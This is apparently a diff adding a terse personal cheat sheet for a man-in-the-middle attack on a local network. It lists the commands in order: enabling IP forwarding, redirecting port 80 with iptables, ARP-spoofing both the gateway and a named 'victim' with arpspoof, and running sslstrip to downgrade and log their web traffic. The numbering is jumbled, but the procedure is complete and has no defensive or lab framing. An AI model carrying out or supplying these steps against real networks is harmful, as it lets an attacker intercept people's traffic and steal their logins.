@@ -1,0 +1,45 @@
+1) configuring :::::  
+
+echo 1 > /proc/sys/net/ipv4/ip_forward
+
+
+2) using iptables:::   
+
+
+iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
+
+
+3) to verify previous command:::::   
+
+iptables -t nat -L PREROUTING 
+
+
+4) now find the target directly or using nmap  then also find your interface ip
+
+
+5) sometimes we have to open port :::: 
+
+iptables -I INPUT 1 -p tcp --dport 8080 -j ACCEPT
+
+
+7)checking previous command::::::: 
+
+
+iptables -L INPUT
+
+
+6) using arpspoof ::::::::convincing machine that we are router::::::::: 
+
+
+arpspoof -i interface_name_here -t gateway_ip_address -r victim_computer_address
+
+
+7)convincing router that we are machine::::::::: 
+
+
+arpspoof -i interface_name_here -t victim_computer_address-r gateway_ip_address
+ 
+
+
+8)now starting process :::::::::  sslstrip -l 8080
+9)to see live process ::::: tail -F sslstrip.log
